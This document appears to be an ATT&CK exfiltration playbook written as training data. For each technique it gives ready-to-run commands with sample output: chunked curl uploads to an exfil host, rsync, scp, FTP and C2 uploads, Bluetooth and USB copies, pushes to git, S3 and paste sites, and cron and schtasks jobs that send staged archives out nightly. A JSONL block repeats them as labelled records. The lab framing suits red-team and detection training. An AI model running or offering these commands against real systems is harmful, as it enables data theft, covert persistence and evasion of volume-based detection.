# Exfiltration Enumeration Playbook (ATT&CK TA0010, Dataset-Ready)

> Purpose: provide realistic, high-value exfiltration training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Exfiltration covers adversary methods used to move collected data out of an environment while reducing detection risk.

- ATT&CK Tactic ID: TA0010
- Created: 17 October 2018
- Last Modified: 25 April 2025
- Techniques in scope: T1020, T1030, T1048, T1041, T1011, T1052, T1567, T1029, T1537

---

## 0. Safety and Lab Controls

1. Use only synthetic data and approved test destinations.
2. Exfil endpoints must be sinkholed/lab-owned.
3. Enforce strict transfer quotas in exercises.
4. Keep full host and network telemetry for each transfer.
5. Remove staged archives and transfer artifacts after validation.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_exfil() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/exfiltration.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1030",
  "technique_name": "Data Transfer Size Limits",
  "scenario": "Operator sends archive in fixed 256KB chunks to controlled endpoint",
  "command": "split -b 256k /tmp/stage_docs.tgz /tmp/chunk_ && for c in /tmp/chunk_*; do curl -X POST --data-binary @${c} https://exfil.lab/upload; done",
  "tool_result": {"status":"success", "highlights":["chunk_aa uploaded", "chunk_ab uploaded"]},
  "analyst_interpretation": "Chunking behavior may evade volume-threshold alerts",
  "confidence": 0.96,
  "mitigation_hint": "Detect repeated small uploads with reassembly patterns"
}
```

---

## 1. Baseline Before Exfiltration

Scenario:
- Record source host state and staged data footprint.

```bash
run_exfil "TA0010" "baseline_identity" sh -lc 'whoami; hostname; date -u'
run_exfil "TA0010" "staged_data_size" sh -lc 'du -sh /tmp/stage 2>/dev/null || echo "no stage dir"'
```

Example result:

```text
corp\labuser
EXFIL-WS-01
2026-04-21T18:03:41Z
128M    /tmp/stage
```

---

## 2. T1020 Automated Exfiltration

Scenario:
- Exfil occurs via automated scripts/jobs after collection and staging.

```bash
run_exfil "T1020" "automated_sync_loop" sh -lc 'for i in 1 2 3; do rsync -az /tmp/stage/ exfil@10.20.40.50:/srv/drop/$(hostname)/; sleep 60; done'
```

### T1020.001 Traffic Duplication

```bash
run_exfil "T1020.001" "traffic_mirror_sim" sh -lc 'echo "simulate switch/SPAN mirror forwarding selected traffic to exfil collector"'
```

Example result:

```text
sending incremental file list
./
finance_q1.xlsx
sent 854,129 bytes  received 91 bytes
simulate switch/SPAN mirror forwarding selected traffic to exfil collector
```

---

## 3. T1030 Data Transfer Size Limits

Scenario:
- Data is split into fixed chunks to avoid threshold-based detections.

```bash
run_exfil "T1030" "split_chunks" sh -lc 'split -b 256k /tmp/stage_docs.tgz /tmp/chunk_ && ls -lh /tmp/chunk_* | head -n 10'
run_exfil "T1030" "chunked_upload" sh -lc 'for c in /tmp/chunk_*; do curl -k -s -X POST https://exfil.lab/upload --data-binary @"$c"; done'
```

Example result:

```text
-rw-r--r--  1 labuser  staff   256K /tmp/chunk_aa
-rw-r--r--  1 labuser  staff   256K /tmp/chunk_ab
ok
ok
```

---

## 4. T1048 Exfiltration Over Alternative Protocol

Scenario:
- Data is exfiltrated over a protocol different from the active C2 path.

### T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol

```bash
run_exfil "T1048.001" "aes_encrypt_then_transfer" sh -lc 'openssl enc -aes-256-cbc -pbkdf2 -pass pass:TrainingOnly! -in /tmp/stage_docs.tgz -out /tmp/stage_docs.aes && scp /tmp/stage_docs.aes exfil@10.20.40.51:/srv/drop/'
```

### T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

```bash
run_exfil "T1048.002" "rsa_encrypt_then_sftp" sh -lc 'openssl rsautl -encrypt -pubin -inkey /tmp/exfil_pub.pem -in /tmp/stage_docs.tgz -out /tmp/stage_docs.rsa && sftp exfil@10.20.40.51:/srv/drop <<< $"put /tmp/stage_docs.rsa"'
```

### T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol

```bash
run_exfil "T1048.003" "ftp_exfil" sh -lc 'printf "open 10.20.40.52\nuser test test\nput /tmp/stage_docs.tgz\nbye\n" | ftp -inv'
```

Example result:

```text
226 Transfer complete.
stage_docs.tgz sent
```

---

## 5. T1041 Exfiltration Over C2 Channel

Scenario:
- Collected data is sent over existing C2 transport.

```bash
run_exfil "T1041" "https_c2_exfil" curl -k -s -X POST https://c2.lab.local/result/upload -H "X-Host: EXFIL-WS-01" --data-binary @/tmp/stage_docs.tgz
```

Example result:

```text
{"status":"received","id":"c2-up-0021"}
```

---

## 6. T1011 Exfiltration Over Other Network Medium

Scenario:
- Data exits over a different medium than normal enterprise egress.

```bash
run_exfil "T1011" "other_medium_sim" sh -lc 'echo "simulate fallback exfil over cellular/Wi-Fi side-channel"'
```

### T1011.001 Exfiltration Over Bluetooth

```bash
run_exfil "T1011.001" "bluetooth_send" sh -lc 'obexftp --nopath --noconn --uuid none --bluetooth 00:11:22:33:44:55 --channel 9 --put /tmp/stage_docs.tgz'
```

Example result:

```text
Connecting...
Sending "/tmp/stage_docs.tgz"... done
```

---

## 7. T1052 Exfiltration Over Physical Medium

Scenario:
- Data is copied to removable physical media for off-network transfer.

```bash
run_exfil "T1052" "physical_media_copy" sh -lc 'cp /tmp/stage_docs.tgz /media/usb0/ 2>/dev/null || cp /tmp/stage_docs.tgz /Volumes/USB/ 2>/dev/null'
```

### T1052.001 Exfiltration over USB

```bash
run_exfil "T1052.001" "usb_verify" sh -lc 'ls -lh /media/usb0/stage_docs.tgz 2>/dev/null || ls -lh /Volumes/USB/stage_docs.tgz 2>/dev/null'
```

Example result:

```text
-rw-r--r-- 1 labuser staff 84M Apr 21 18:09 /media/usb0/stage_docs.tgz
```

---

## 8. T1567 Exfiltration Over Web Service

Scenario:
- Data leaves the environment via legitimate web services.

### T1567.001 Exfiltration to Code Repository

```bash
run_exfil "T1567.001" "git_repo_exfil" sh -lc 'cd /tmp/stage && git init && git remote add origin https://gitlab.lab.local/exfil/drop.git && git add . && git commit -m "sync" && git push origin main'
```

### T1567.002 Exfiltration to Cloud Storage

```bash
run_exfil "T1567.002" "cloud_storage_exfil" aws s3 cp /tmp/stage_docs.tgz s3://external-lab-dropbox/stage_docs.tgz
```

### T1567.003 Exfiltration to Text Storage Sites

```bash
run_exfil "T1567.003" "text_storage_exfil" sh -lc 'base64 /tmp/stage_docs.tgz | head -c 5000 | curl -s -X POST -d @- https://paste.lab.local/api/create'
```

### T1567.004 Exfiltration Over Webhook

```bash
run_exfil "T1567.004" "webhook_exfil" curl -s -X POST https://hooks.lab.local/services/T/EXFIL/001 -F "file=@/tmp/stage_docs.tgz"
```

Example result:

```text
{"ok":true,"url":"https://gitlab.lab.local/exfil/drop"}
upload: /tmp/stage_docs.tgz to s3://external-lab-dropbox/stage_docs.tgz
{"status":"accepted"}
```

---

## 9. T1029 Scheduled Transfer

Scenario:
- Exfiltration is scheduled during low-noise windows.

```bash
run_exfil "T1029" "cron_schedule" sh -lc '(crontab -l 2>/dev/null; echo "15 2 * * * /usr/bin/curl -k -X POST https://exfil.lab/upload --data-binary @/tmp/stage_docs.tgz") | crontab -'
run_exfil "T1029" "schtasks_schedule" cmd /c "schtasks /Create /SC DAILY /TN ExfilJob /TR \"powershell -c Invoke-WebRequest -Uri https://exfil.lab/upload -Method Post -InFile C:\\Temp\\stage_docs.tgz\" /ST 02:15 /F"
```

Example result:

```text
crontab installed
SUCCESS: The scheduled task "ExfilJob" has successfully been created.
```

---

## 10. T1537 Transfer Data to Cloud Account

Scenario:
- Data is moved to adversary-controlled cloud account/tenant.

```bash
run_exfil "T1537" "cross_account_s3" aws s3 cp /tmp/stage_docs.tgz s3://attacker-account-drop/stage_docs.tgz --profile compromised-user
run_exfil "T1537" "cross_tenant_share_sim" sh -lc 'echo "simulate cross-tenant document share/backup transfer to adversary-controlled cloud account"'
```

Example result:

```text
upload: /tmp/stage_docs.tgz to s3://attacker-account-drop/stage_docs.tgz
simulate cross-tenant document share/backup transfer to adversary-controlled cloud account
```

---

## 11. Label-Ready Examples (JSONL)

```json
{"technique":"T1041","command":"curl -X POST https://c2.lab.local/result/upload --data-binary @stage_docs.tgz","result":"Server acknowledged upload","interpretation":"Data sent over established C2 channel"}
{"technique":"T1030","command":"split -b 256k stage_docs.tgz chunk_","result":"Archive fragmented into fixed chunks","interpretation":"Transfer-size limits applied to evade threshold alerts"}
{"technique":"T1567.002","command":"aws s3 cp stage_docs.tgz s3://external-lab-dropbox/","result":"Object upload completed","interpretation":"Exfiltration through legitimate cloud storage service"}
{"technique":"T1052.001","command":"cp stage_docs.tgz /media/usb0/","result":"File written to removable drive","interpretation":"Physical-medium exfiltration path used"}
{"technique":"T1048.003","command":"ftp put stage_docs.tgz","result":"Transfer complete","interpretation":"Unencrypted non-C2 protocol used for data theft"}
```

---

## 12. Coverage Checklist

- TA0010 Exfiltration
- T1020 Automated Exfiltration
- T1020.001 Traffic Duplication
- T1030 Data Transfer Size Limits
- T1048 Exfiltration Over Alternative Protocol
- T1048.001 Exfiltration Over Symmetric Encrypted Non-C2 Protocol
- T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
- T1041 Exfiltration Over C2 Channel
- T1011 Exfiltration Over Other Network Medium
- T1011.001 Exfiltration Over Bluetooth
- T1052 Exfiltration Over Physical Medium
- T1052.001 Exfiltration over USB
- T1567 Exfiltration Over Web Service
- T1567.001 Exfiltration to Code Repository
- T1567.002 Exfiltration to Cloud Storage
- T1567.003 Exfiltration to Text Storage Sites
- T1567.004 Exfiltration Over Webhook
- T1029 Scheduled Transfer
- T1537 Transfer Data to Cloud Account

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
